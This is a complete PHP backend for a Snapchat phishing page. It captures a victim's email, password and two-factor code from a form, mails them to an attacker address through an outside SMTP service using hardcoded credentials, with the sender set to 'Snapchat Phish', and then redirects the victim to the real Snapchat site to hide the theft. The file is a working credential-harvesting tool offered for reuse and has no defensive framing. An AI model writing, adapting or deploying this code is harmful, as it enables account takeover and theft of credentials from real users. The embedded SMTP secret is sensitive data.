<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require '../PHPMailer/src/Exception.php';
require '../PHPMailer/src/PHPMailer.php';
require '../PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $twofa = $_POST["twofa"];
    $data = "Email: $email | Password: $password | 2FA: $twofa\n";

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.mailersend.net';
        $mail->SMTPAuth = true;
        $mail->Username = 'MS_PdEWfE@snap-security.xyz';
        $mail->Password = 'mssp.g55InlM.k68zxl2ejoklj905.FVJ2wCD';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('phish@snap-security.xyz', 'Snapchat Phish');
        $mail->addAddress('realdrywest@email.com'); // YOUR EMAIL HERE
        $mail->Subject = 'Snapchat Creds';
        $mail->Body = $data;

        $mail->send();
    } catch (Exception $e) {
        error_log("Mail error: {$mail->ErrorInfo}");
    }

    header("Location: https://www.snapchat.com");
    exit();
}
?>